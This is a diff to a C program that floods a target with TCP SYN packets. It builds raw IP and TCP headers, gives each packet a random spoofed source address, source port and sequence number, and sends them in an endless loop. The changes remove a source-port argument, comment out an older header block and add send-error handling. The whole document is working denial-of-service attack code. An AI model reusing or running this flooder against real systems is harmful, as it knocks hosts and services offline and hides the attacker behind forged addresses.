@@ -31,7 +31,7 @@ uint16_t check_sum(uint16_t *addr, int len) {
   return answer;
 }
 
-void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
+void attack(int sockfd, struct sockaddr_in *target) {
   char buf[128] = {0};
   //include in /usr/include/netinet/ip.h
   struct iphdr *ip;
@@ -40,7 +40,7 @@ void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
 
   ip_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
   ip = (struct iphdr*) buf;
-
+/*
   ip -> ip_v = 4; //IPVERSION;
   ip -> ip_hl = sizeof(struct ip) >> 2;
   ip -> ip_tos = 0;
@@ -51,7 +51,7 @@ void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
   ip -> ip_p = IPPROTO_TCP;
   ip -> ip_sum = 0;
   ip -> ip_dst = target -> sin_addr;
-
+*/
   ip -> ihl = 5;
   ip -> version = 4;
   ip -> tos = 0;
@@ -86,12 +86,17 @@ void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
 
   while(1) {
     char ipbuf[16];
-    sprintf(ipbuf, "%d.%d.%d.%d", random()%255, random()%255, random()%255, random()%255);
+    sprintf(ipbuf, "%d.%d.%d.%d", (int)random()%255, (int)random()%255, (int)random()%255, (int)random()%255);
+    //printf("%s\n", ipbuf);
     ip -> saddr = inet_addr(ipbuf);
     tcp -> check = check_sum((u_short*)tcp, sizeof(struct tcphdr));
     tcp -> source = htons(random());
-    tcp -> seq = random();
-    sendto(sockfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in));
+    tcp -> seq = htons(random());
+    if (sendto(sockfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in)) < 0) {
+      printf("attack error\n");
+      //printf("attack success\n");
+      continue;
+    }
   }
 }
 
@@ -104,7 +109,7 @@ int main(int argc, char **argv)
   unsigned short srcport;
 
   //cmd + ip + attack port + my port
-  if (argc != 4) {
+  if (argc != 3) {
     printf("Usage:%s target dstport srcport\n", argv[0]);
     exit(1);
   }
@@ -130,6 +135,6 @@ int main(int argc, char **argv)
     exit(1);
   }
   setuid(getpid());
-  srcport = atoi(argv[3]);
-  attack(skfd, &target, srcport);
+  //srcport = atoi(argv[2]);
+  attack(skfd, &target);
 }
